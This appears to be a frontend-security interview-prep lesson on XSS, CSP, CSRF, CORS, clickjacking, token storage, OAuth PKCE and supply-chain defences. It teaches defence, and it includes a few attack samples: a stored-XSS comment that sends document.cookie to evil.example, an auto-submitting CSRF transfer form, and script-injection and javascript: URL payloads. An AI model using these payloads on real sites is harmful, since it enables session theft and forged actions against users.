## Why interviewers ask about security

Security comes up in senior frontend interviews in two forms: direct questions ("How do you prevent XSS in React?", "Where do you store the token?") and as the follow-up that ends a system design round ("…and how is this secured?"). The answer that fails is vague: *"sanitize input and use HTTPS."* The answer that passes names a **threat model**: who the attacker is, what they can do, and **which control stops which attack**, including what each control does *not* do.

## The foundation: origins, sites and the same-origin policy

- **Origin** = scheme + host + port. `https://app.example.com` and `https://api.example.com` are **different origins**.
- **Site** = scheme + registrable domain (eTLD+1, per the Public Suffix List). Those two hosts are the **same site**. `alice.github.io` and `bob.github.io` are *different* sites, because `github.io` is a public suffix.
- **Same-origin policy (SOP):** a page can't **read** another origin's DOM or responses. It does **not** stop a page from **sending** requests (forms, `<img>`, `<script>`, `fetch`), and cookies are attached by *site/domain* rules, not origin. That gap is where CSRF lives.

| Attack | The attacker gets… | Primary defences |
|---|---|---|
| XSS | Their JavaScript running **in your origin** | Contextual escaping, sanitization, safe sinks, CSP, Trusted Types |
| CSRF | The user's browser **sending** requests with the user's cookies (blind) | SameSite cookies, CSRF tokens, Origin / Fetch Metadata checks |
| Clickjacking | The user's **clicks** on your framed page | `frame-ancestors` |
| Token theft | Credentials **replayable elsewhere** | HttpOnly cookies, BFF, short-lived tokens |
| Supply chain | Code in your bundle or CI | Lockfiles, review, pinning, SRI, fewer dependencies |

## XSS: cross-site scripting

XSS means an attacker gets **their JavaScript to run in your origin**. From there they can do anything the user can: read the page, call your APIs with the user's cookies, read tokens in `localStorage`, log keystrokes, or rewrite the payment form.

| Type | Where the payload lives | Example |
|---|---|---|
| **Stored** | Your database (comment, display name, product review), shown to other users | `<img src=x onerror="fetch('//evil.example?c='+document.cookie)">` as a comment |
| **Reflected** | The request (URL/query), echoed into the response by the server | `/search?q=<script>…</script>` |
| **DOM-based** | Never reaches the server: client JS moves a **source** into a **sink** | `el.innerHTML = decodeURIComponent(location.hash.slice(1))` |

**Sources** are attacker-influenced inputs: `location.*`, `document.referrer`, `postMessage` data, storage, and API responses that contain user content. **Sinks** interpret strings as code or markup: `innerHTML` / `outerHTML` / `insertAdjacentHTML`, `document.write`, `eval` / `new Function` / `setTimeout(string)`, `script.src`, `iframe.srcdoc`, and navigation to `javascript:` URLs (`a.href`, `location = …`, `window.open`).

The defence principle: **encode for the output context at the sink** (HTML text, attribute, URL, JS and CSS contexts all differ), avoid dangerous sinks, **sanitize when you must render HTML**, and add **CSP and Trusted Types** as a second line.

### What React protects

- **Text and attribute values are escaped.** On the client, React writes text with DOM text APIs and attributes with `setAttribute`; in SSR it escapes them. `<p>{comment}</p>` with `<img onerror=…>` renders as harmless literal text.
- **Event handlers are functions, not strings.** You can't smuggle an `onclick="…"` string through JSX.
- **React 19 blocks `javascript:` URLs** in `href`, `src`, `action` and `formAction`, replacing them with a URL that throws ("React has blocked a javascript: URL as a security precaution"), in both client and server rendering. React 16.9–18 only logged a **dev warning**, so many production apps are still exposed.

```ts run
// The check react-dom 19 runs before writing href/src/action (sanitizeURL):
const isJavaScriptProtocol =
  /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;

const candidates = [
  'javascript:alert(1)',
  ' JaVaScRiPt:alert(1)',
  'java\tscript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'https://example.com',
];
for (const url of candidates) {
  console.log(JSON.stringify(url).padEnd(46), isJavaScriptProtocol.test(url) ? 'blocked by React' : 'passed through');
}
// Note what passes through: only javascript: is special-cased. Your own scheme allowlist still matters.
```

### What React does *not* protect

1. **`dangerouslySetInnerHTML`.** The name is the warning. Sanitize right before rendering (DOMPurify), or render from structured data (e.g. markdown → AST → React elements, without a raw-HTML plugin).
2. **URLs beyond `javascript:`, and sinks outside React's attribute path:** `data:` and other schemes, `window.location.href = next`, `window.open(url)`, `router.push(url)` (open redirects). Validate against an **allowlist** of schemes (http, https, mailto, relative). That's today's core exercise.
3. **Refs and direct DOM access:** `ref.current.innerHTML = …`, `insertAdjacentHTML`, jQuery plugins, third-party widgets.
4. **Spreading untrusted props:** `<div {...cmsProps}>` lets the CMS (or an attacker who controls it) supply `dangerouslySetInnerHTML` or `href`. Pick known keys explicitly.
5. **Serializing state into `<script>` during SSR:**

```tsx
// ❌ If any string contains "</script><script>…", the HTML parser closes your script element there:
//    it knows nothing about JS string quoting.
<script dangerouslySetInnerHTML={{ __html: `window.__STATE__ = ${JSON.stringify(state)}` }} />
```

```ts run
const state = { bio: '</script><script>alert("pwned")</script>' };

const naive = `<script>window.__STATE__ = ${JSON.stringify(state)}</script>`;
const safeJson = JSON.stringify(state).replace(/</g, '\\u003c'); // "<" can't start a tag any more
const safe = `<script>window.__STATE__ = ${safeJson}</script>`;

console.log(naive);
console.log(safe);
console.log('still round-trips:', JSON.parse(safeJson).bio === state.bio);
```

Use your framework's serializer (Next.js and React Router do this for you) or a library such as `serialize-javascript`/`devalue`. You can also put JSON in `<script type="application/json">` and `JSON.parse(el.textContent)`, but you still have to escape `<`. Hand-rolled SSR is where this bug lives.

6. **Third-party HTML and scripts:** CMS bodies, markdown with raw HTML, analytics and tag managers (they run with **full privileges** in your origin), and user-uploaded SVG (which can contain script when opened directly; serve uploads from a separate sandbox domain).
7. **Other code-from-strings sinks:** `eval`, `new Function`, `setTimeout('string')`, and user-controlled `style` values (CSS injection can exfiltrate data via selectors and `url()`).

> [!MISTAKE]
> "We use React, so we're safe from XSS." React escapes **text**. It doesn't sanitize HTML, it validates only `javascript:` URLs (and only since v19), and it can't see `innerHTML`, `location`, `eval` or third-party scripts.

{{quiz:react-xss-sink}}

### Sanitization with DOMPurify

```tsx
import DOMPurify from 'dompurify';
import { useMemo } from 'react';

export function RichText({ html }: { html: string }) {
  // The html-only profile drops <script>, on* handlers, javascript: URLs, SVG and MathML.
  const clean = useMemo(() => DOMPurify.sanitize(html, { USE_PROFILES: { html: true } }), [html]);
  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

Rules worth stating in an interview:

- **Allowlist, never blocklist.** New vectors keep appearing; a list of "bad tags" is always incomplete.
- **Parse with the browser's parser and clean the DOM tree**, not with regexes over strings. Parser quirks and *mutation XSS* (markup that changes meaning when re-serialised and re-parsed) defeat string filters.
- **Sanitize at the sink, as late as possible**, don't modify the HTML afterwards, and keep the library updated (DOMPurify ships fixes for newly found bypasses).
- A built-in **HTML Sanitizer API** (`element.setHTML()`) is being standardised and is starting to ship in browsers. Check support; until it's everywhere, DOMPurify is the default answer.

You'll build a small allowlist sanitizer with `DOMParser` in today's stretch exercise to see why parsing and allowlisting matter.

## CSP: Content Security Policy, the second line of defence

CSP is a **response header** that tells the browser which scripts (and other resources) may run. It doesn't remove the injection; it makes the injected script **fail to execute**.

**Strict CSP (nonce-based)**, the approach Google and OWASP recommend:

```http
Content-Security-Policy:
  script-src 'nonce-4AEemGb0xJptoIGFP3Nd' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'self';
  report-to csp
```

```html
<script nonce="4AEemGb0xJptoIGFP3Nd" src="/assets/app.js"></script>
```

- **Nonce:** unguessable and **fresh for every response** (≥ 128 bits of randomness). An injected `<script>` doesn't have it, so it's blocked. Inline event handlers (`onclick="…"`) and `javascript:` URLs are blocked too.
- **`'strict-dynamic'`:** scripts created by an already-trusted script (`document.createElement('script')`) are trusted as well, so code splitting and loaders keep working. CSP Level 3 browsers then **ignore host allowlists, `https:` and `'unsafe-inline'`**; those only remain as fallbacks for old browsers.
- **Why not allowlists?** `script-src 'self' https://cdn.example.com` is usually bypassable: an allowlisted host with a JSONP endpoint or an old AngularJS build lets attackers run code. Google's research on real-world policies found the large majority of allowlist-based CSPs could be bypassed.
- **`object-src 'none'`** disables plugins. **`base-uri 'none'`** stops an injected `<base href>` from redirecting your relative script URLs.
- **Static or CDN-cached HTML** can't carry a per-response nonce, so use **hash-based** strict CSP (`'sha256-…'` on a small inline loader + `'strict-dynamic'`). Never cache HTML containing a nonce: a cached nonce is a known nonce.
- `<meta http-equiv="Content-Security-Policy">` works, but it doesn't support `frame-ancestors`, reporting or `sandbox`. Prefer the header.

**Rollout plan:**

1. Ship the policy as `Content-Security-Policy-Report-Only` with a reporting endpoint (`Reporting-Endpoints` + `report-to`, keeping `report-uri` as a fallback).
2. Fix violations: add nonces through your framework, move inline handlers into code, move inline scripts into files, and filter out noise from browser extensions.
3. Enforce, and keep reporting on.
4. Add **Trusted Types**.

**Trusted Types** lock down DOM XSS sinks:

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-sanitizer
```

```ts
// With the policy enforced, innerHTML / script.src / eval etc. reject plain strings.
const policy = trustedTypes.createPolicy('app-sanitizer', {
  createHTML: (input: string) => DOMPurify.sanitize(input),
});
el.innerHTML = policy.createHTML(userHtml); // ✅ a TrustedHTML value produced by a reviewed policy
el.innerHTML = userHtml;                    // ❌ TypeError (or a violation report in report-only mode)
```

This turns "audit every `innerHTML` in two million lines" into "review the few places that create policies". Chromium has supported Trusted Types for years and other engines have been adding it, so check current support. Report-only mode is valuable even where enforcement isn't available.

> [!INTERVIEW] Say it like this
> "CSP doesn't fix XSS; it limits the blast radius. I'd deploy a nonce-based strict CSP (`script-src 'nonce-…' 'strict-dynamic'`, `object-src 'none'`, `base-uri 'none'`), roll it out in report-only mode first, and then add Trusted Types so DOM sinks only accept values produced by a reviewed sanitizer policy."

## CSRF and SameSite cookies

**Cross-site request forgery:** the attacker's page makes the victim's browser send a **state-changing** request to your site, and the browser attaches your cookies automatically (*ambient authority*). The attacker can't read the response, and doesn't need to.

```html
<!-- on https://evil.example -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker" /><input name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>
```

**The `SameSite` cookie attribute:**

| Value | Sent on cross-site requests? | Notes |
|---|---|---|
| `Strict` | Never | Even a link from an email arrives "logged out" on the first request; often used for a separate high-privilege cookie |
| `Lax` | Only top-level navigations with safe methods (clicking a link: GET) | Chrome treats cookies **without** a SameSite attribute as Lax (other browsers differ). **Set it explicitly** |
| `None` | Always | Requires `Secure`; for embedded/third-party contexts, which browsers increasingly restrict |

> [!NOTE]
> Chrome's default-Lax has a nuance: cookies with **no** SameSite attribute are still sent on top-level cross-site `POST`s for the first two minutes after they're set ("Lax + POST"), for compatibility with some login flows. Another reason to set the attribute explicitly.

SameSite caveats interviewers probe:

- **It's about *site*, not origin.** XSS on, or a takeover of, `blog.example.com` can CSRF `app.example.com`; they're the same site.
- **GET must never change state**, because Lax still sends cookies on cross-site top-level GETs.
- **Defence in depth** for state-changing endpoints:
  1. A **CSRF token**: a synchronizer token stored server-side, or a *signed* double-submit cookie bound to the session, sent back in a header or hidden field.
  2. **Require a custom header or a JSON content type** on API calls. Cross-origin requests with these need a CORS **preflight**, which the attacker's origin will fail (if your CORS config is correct).
  3. **Check `Origin`** (and **Fetch Metadata**: `Sec-Fetch-Site: same-origin | same-site | cross-site | none`) on the server, and reject cross-site state-changing requests.
- Tokens sent in an `Authorization` header (not cookies) are **immune to CSRF**, because the browser never attaches them on its own. The cost is that JavaScript can read them (see token storage below).
- **Login CSRF:** the attacker logs the victim into the *attacker's* account. The OAuth `state` parameter and CSRF tokens on login forms prevent it.

| | XSS | CSRF |
|---|---|---|
| Attacker can | Run code in your origin | Make the browser send requests, blind |
| Read responses? | Yes | No |
| Root cause | Unescaped/unsanitized output reaching a sink | Ambient credentials (cookies) |
| Defences | Escaping, sanitization, CSP, Trusted Types | SameSite, CSRF tokens, Origin/Fetch Metadata checks |
| Relationship | **XSS defeats every CSRF defence** (the script can read the token and send same-origin requests) | |

{{quiz:samesite-same-site-subdomain}}

## CORS: cross-origin resource sharing

The SOP blocks **reading** cross-origin responses. CORS is how a server **opts in** to letting specific other origins read them.

- **CORS protects the user, not your server.** It stops a malicious page from reading data that another origin would return *to this user* (with their cookies, or from their internal network). It's enforced by the browser; `curl` ignores it. It is **not** an authentication or authorization mechanism, and not a CSRF defence.
- **Simple requests** (`GET`/`HEAD`/`POST` with only CORS-safelisted headers, and a `Content-Type` of `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`) are **sent immediately**. The browser then checks `Access-Control-Allow-Origin` and either exposes the response or hides it (`TypeError: Failed to fetch`). **The server has already processed the request.**
- **Preflighted requests** cover everything else: `PUT`/`PATCH`/`DELETE`, `Content-Type: application/json`, `Authorization` or custom headers. The browser first sends `OPTIONS` and only sends the real request if the answer allows it:

```
Browser (https://app.example)                              API (https://api.example)
OPTIONS /orders
  Origin: https://app.example
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: content-type, authorization   ─────►
                                                                 ◄─────  204 No Content
  Access-Control-Allow-Origin: https://app.example
  Access-Control-Allow-Methods: POST
  Access-Control-Allow-Headers: content-type, authorization
  Access-Control-Max-Age: 600                                    (preflight cached 10 min)
POST /orders  (the real request)                                ─────►
                                                                 ◄─────  201 + Access-Control-Allow-Origin: https://app.example
```

- **Credentials:** `fetch(url, { credentials: 'include' })` only exposes the response if the server sends `Access-Control-Allow-Credentials: true` **and an exact origin**. `Access-Control-Allow-Origin: *` is rejected with credentials. When you echo the origin from an allowlist, add `Vary: Origin` so caches don't serve one origin's header to another.
- **Dangerous misconfigurations:** reflecting *any* `Origin` with credentials (now every website can read your users' data); allowlisting `null` (sandboxed iframes and `data:` documents send `Origin: null`); sloppy suffix or regex matching (`evil-example.com` matching `example.com`).
- `Access-Control-Expose-Headers` lets JS read non-safelisted response headers. `mode: 'no-cors'` bypasses nothing: you get an **opaque** response you can't read.
- **Often the best CORS config is none:** serve the API on the same origin via a reverse proxy, Vite's `server.proxy` in development, or a BFF.

> [!MISTAKE]
> "We got a CORS error, so we added `Access-Control-Allow-Origin: *`." With cookies it still fails, and on an authenticated API without cookies it exposes data to every site. The other classic: "CORS protects our API from attackers." It doesn't. Attackers just don't use a browser.

{{quiz:cors-simple-post-reaches-server}}

## Clickjacking

The attacker loads your page in an invisible iframe (`opacity: 0`) over a decoy ("Click to win!"), so the user's click lands on your "Delete account" or "Confirm payment" button.

- **Defence:** `Content-Security-Policy: frame-ancestors 'none'` (or `'self' https://partner.example`). It supersedes `X-Frame-Options: DENY | SAMEORIGIN`; send both for very old browsers (XFO has no allowlist, and `ALLOW-FROM` is obsolete).
- **Don't confuse it with `frame-src`,** which controls what *your* page may embed, not who may embed you.
- JavaScript frame-busting is unreliable (sandboxed iframes can disable it). `SameSite=Lax`/`Strict` cookies also mean a cross-site framed page is logged out, which helps.

## Where to store auth tokens

| Storage | Readable by injected JS? | Sent automatically (CSRF)? | Survives reload | Notes |
|---|---|---|---|---|
| `localStorage` / `sessionStorage` | **Yes**: one XSS exfiltrates a long-lived token | No | Yes / per tab | Simple; the stolen token works from the attacker's machine |
| In memory (closure/variable) | Yes, while the page runs | No | No, needs a silent refresh | Smaller window; refresh usually via an HttpOnly cookie |
| `HttpOnly; Secure; SameSite` cookie | **No** | Yes, so add CSRF defences | Yes | Best default for first-party apps; the API should be same-site |
| **BFF** session cookie (tokens stay server-side) | No | Yes | Yes | Recommended for high-security SPAs; costs an extra backend hop |

**The nuance senior candidates mention:** with XSS, the attacker can make authenticated requests *from the victim's open page* in every option. HttpOnly doesn't stop that. What HttpOnly buys you is that the credential **can't be exfiltrated and replayed later from elsewhere**, which limits the attack to the lifetime of the page. So: **prevent XSS first**, then choose storage to limit the blast radius.

A recommended default:

```http
Set-Cookie: __Host-session=…; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=28800
```

The `__Host-` prefix forces `Secure`, `Path=/` and **no `Domain`**, so a subdomain can't set or overwrite the cookie. Pair it with CSRF defences and short-lived access tokens. If the SPA must call APIs with OAuth access tokens, use the **Backend-for-Frontend (BFF)** pattern: the BFF is a *confidential* OAuth client that holds the tokens server-side and proxies API calls; the browser only has a session cookie.

## OAuth 2.0 / OIDC for SPAs: Authorization Code + PKCE

**Vocabulary:** the **resource owner** (the user), the **client** (your SPA, a *public* client because it can't keep a secret), the **authorization server** (Auth0, Okta, Entra ID, Keycloak…) and the **resource server** (your API). **OAuth** is delegated *authorization* (an **access token** for APIs). **OpenID Connect** adds *authentication*: an **ID token** (a JWT about the user) meant for the client, never for calling APIs.

**The flow:**

1. The SPA generates a random `code_verifier`, derives `code_challenge = BASE64URL(SHA-256(verifier))`, plus a random `state` (CSRF protection for the callback) and a `nonce` (binds the OIDC ID token to this login). It stores the verifier and state in `sessionStorage`.
2. It redirects to `/authorize?response_type=code&client_id=…&redirect_uri=…&scope=openid profile&state=…&nonce=…&code_challenge=…&code_challenge_method=S256`.
3. The user authenticates **at the authorization server** (your app never sees the password), which redirects back to `redirect_uri?code=…&state=…`.
4. The SPA checks that `state` matches, then `POST`s to `/token` with `grant_type=authorization_code`, the `code` and the **`code_verifier`**.
5. The authorization server checks that `SHA-256(verifier)` equals the stored challenge and returns an access token (and an ID token, and for SPAs a **rotating**, short-lived refresh token).
6. The SPA calls the API with `Authorization: Bearer <access token>` (or, better, the BFF does).

```ts run
// PKCE with the Web Crypto API: what an OIDC library does for you.
function base64url(bytes: Uint8Array): string {
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

const verifier = base64url(crypto.getRandomValues(new Uint8Array(32))); // 43 chars of entropy
const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
const challenge = base64url(new Uint8Array(digest));
const state = crypto.randomUUID();

console.log({ verifier, length: verifier.length, challenge });
const params = new URLSearchParams({
  response_type: 'code',
  client_id: 'spa-client',
  redirect_uri: 'https://app.example/callback',
  scope: 'openid profile',
  state,
  code_challenge: challenge,
  code_challenge_method: 'S256',
});
console.log(`https://auth.example/authorize?${params}`);
// The verifier never leaves the browser until the back-channel /token call.
```

**Why PKCE:** an attacker who intercepts the **authorization code** (from browser history, logs, a malicious app registered for the same redirect, or code injection into another session) can't redeem it without the verifier, which never travelled through the front channel. The **OAuth 2.0 Security Best Current Practice (RFC 9700, January 2025)** requires PKCE (or an equivalent) for public clients and recommends it for all clients. The OAuth 2.1 draft makes it mandatory for the code flow.

**Why the implicit flow is deprecated:** `response_type=token` returned the access token **in the URL fragment**, where it leaks via history, logs, extensions and referrers. It offers no sender binding and no safe refresh, and it's open to token injection. It existed only because SPAs once couldn't call the token endpoint cross-origin; CORS fixed that. The Resource Owner Password Credentials grant is gone too: never collect passwords in your SPA.

**Practicalities:** use a certified library (e.g. `oidc-client-ts`) rather than hand-rolling the flow, register exact redirect URIs, and use refresh-token rotation or sender-constrained tokens (DPoP, RFC 9449). The IETF guidance for browser-based apps ranks a **BFF** as the most secure architecture.

> [!INTERVIEW] Say it like this
> "For an SPA I'd use the Authorization Code flow with PKCE (implicit is deprecated by the OAuth Security BCP) through a certified library. Where I can, I'd put a backend-for-frontend in front, so tokens never reach the browser and the SPA just has an HttpOnly, Secure, SameSite session cookie plus CSRF protection."

## Supply-chain security

Every dependency in your bundle runs with **full privileges in your origin**, and install scripts run on developer and CI machines. Incidents worth naming: **event-stream** (2018, a new maintainer added wallet-stealing code), **ua-parser-js** (2021, hijacked account), **polyfill.io** (2024, a new domain owner served malicious code to hundreds of thousands of sites), and the **September 2025 npm compromises** (a phished maintainer's popular packages such as `chalk` and `debug` were published with browser-side crypto-stealing code, followed by the self-propagating "Shai-Hulud" worm that stole tokens from developer machines).

- **Commit the lockfile** and install with `npm ci` / `pnpm install --frozen-lockfile` in CI: reproducible trees, no silent upgrades.
- **Review and pin updates** (Renovate/Dependabot PRs with changelogs), with a **cooldown** before adopting brand-new releases (e.g. Renovate's or pnpm's `minimumReleaseAge`). Most malicious versions are caught within days.
- **Audit:** `npm audit`, Dependabot alerts, Snyk. Triage by reachability: is the vulnerable code in the browser bundle or only in dev tooling?
- **Restrict install scripts:** `ignore-scripts`, or pnpm's default of not running dependencies' lifecycle scripts unless allow-listed.
- **Provenance:** prefer packages published with provenance / trusted publishing; `npm audit signatures`; 2FA for your own maintainers.
- **Fewer dependencies:** is ten lines of code worth a transitive tree?
- **Runtime third-party scripts:** self-host where possible; otherwise pin a version and use **Subresource Integrity**:

```html
<script src="https://cdn.example.com/widget@4.2.1/widget.min.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

SRI only works for **immutable, versioned** files (a "latest" URL changes and gets blocked). Tag managers can't be SRI'd: constrain them with CSP, sandbox them where possible, and keep them **off checkout and login pages**.

## Never ship secrets to the client

- **Everything in the bundle is public:** JS, source maps, `window.__STATE__`, network responses. Minification is not encryption.
- **Build-time env vars:** Vite exposes only `VITE_*` variables (as `import.meta.env.VITE_*`), and Next.js only `NEXT_PUBLIC_*`, inlined as plain strings. Anything with those prefixes is public by definition.
- **Secret keys** (payment secret keys, LLM provider keys, database credentials) belong on a backend, BFF or serverless function. The browser calls *your* endpoint, which adds auth, rate limits and validation.
- **Keys designed to be public** (Stripe publishable keys, Maps keys, Firebase config) should be restricted by referrer/domain, scope and quota, and protected by server-side rules, not by hiding them.
- **Authorization is a server concern.** Hiding a button is UX. Every endpoint must check permissions.
- Run **secret scanning** in CI (GitHub secret scanning, gitleaks). If a secret leaked, **rotate it**; deleting the commit isn't enough.

## Other controls you should be able to name

| Control | Purpose |
|---|---|
| `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` | HTTPS only; stops SSL stripping |
| `X-Content-Type-Options: nosniff` | No MIME sniffing (an upload can't be executed as a script) |
| `Referrer-Policy: strict-origin-when-cross-origin` | Don't leak paths and query tokens in `Referer` (the modern browser default) |
| `Permissions-Policy: camera=(), geolocation=()` | Disable powerful features for your page and its iframes |
| `Cross-Origin-Opener-Policy: same-origin` | Isolate your window from cross-origin popups (XS-Leaks; prerequisite for cross-origin isolation) |
| `postMessage` | Check `event.origin` against an allowlist; send with an explicit `targetOrigin`, never `'*'` for sensitive data |
| `<iframe sandbox>` | Run untrusted content with minimal privileges |

## Key takeaways

- **SOP** blocks reading, not sending. That asymmetry explains why CSRF exists and why CORS can't stop it.
- **React escapes text** and, since v19, blocks `javascript:` URLs. You still own `dangerouslySetInnerHTML` (sanitize with DOMPurify), URL allowlists, non-React sinks, SSR state serialization and third-party code.
- **Strict CSP** = per-response nonce + `'strict-dynamic'` + `object-src 'none'` + `base-uri 'none'`, rolled out in report-only first; **Trusted Types** lock down DOM sinks.
- **CSRF:** set SameSite explicitly (it's *site*-based), keep GETs safe, add tokens or Origin/Fetch Metadata checks. XSS defeats all CSRF defences.
- **CORS** protects the *user's data* in the browser, not your server. Simple requests still execute; credentials need an exact origin.
- **Clickjacking:** `frame-ancestors`. **Tokens:** HttpOnly `__Host-` cookies or a BFF; localStorage is one XSS away from token theft.
- **OAuth for SPAs:** Authorization Code + PKCE (RFC 9700); implicit is deprecated; `state` and `nonce` matter.
- **Supply chain:** lockfiles, reviewed and delayed updates, SRI on pinned third-party scripts, fewer dependencies. **No secrets in the bundle, ever.**
